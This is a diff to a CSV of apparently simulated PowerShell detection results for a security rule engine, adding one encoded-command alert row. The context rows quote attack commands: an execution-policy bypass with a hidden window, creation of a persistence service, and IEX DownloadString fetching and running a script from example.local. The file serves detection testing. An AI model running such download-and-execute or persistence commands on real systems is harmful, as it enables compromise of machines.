@@ -37,6 +37,7 @@ timestamp,host,rule,severity,mitre,command_excerpt,matched_context
 2026-01-15T10:26:00+00:00,WS-501,PowerShell New-Service Persistence,medium,T1543.003,New-Service -Name DemoSvc -BinaryPathName C:\ProgramData\demo-svc.exe,New-Service -Name DemoSvc -BinaryPathName C:\Progra
 2026-01-15T09:00:00+00:00,WS-101,PowerShell Bypass/Hidden Flags,medium,T1059.001,powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Write-Output SIMULATED,powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy By
 2026-01-15T09:02:00+00:00,WS-101,Encoded PowerShell Command,medium,T1059.001,powershell.exe [REDACTED] [BASE64...REDACTED],powershell.exe [REDACTED] [BASE64...REDACTED]
+2026-01-15T09:02:00+00:00,WS-101,EncodedCommand Generic (Safe),medium,T1059.001,powershell.exe [REDACTED] [BASE64...REDACTED],powershell.exe [REDACTED] [BASE64...REDACTED]
 2026-01-15T09:04:00+00:00,WS-101,Suspicious Web Download,medium,T1105,powershell.exe [REDACTED] https://example.local/stage1.ps1 -OutFile C:\ProgramData\stage1.ps1,powershell.exe [REDACTED] https://example.local/stage1.ps1 -OutFi
 2026-01-15T09:06:00+00:00,WS-101,Suspicious Web Download,medium,T1105,powershell.exe IEX ([REDACTED]).DownloadString('https://example.local/bootstrap.txt'),powershell.exe IEX ([REDACTED]).DownloadString('https://example.local/
 2026-01-15T09:06:00+00:00,WS-101,PowerShell DownloadString Execution,high,T1059.001,powershell.exe IEX ([REDACTED]).DownloadString('https://example.local/bootstrap.txt'),hell.exe IEX ([REDACTED]).DownloadString('https://example.local/bootstrap.txt')
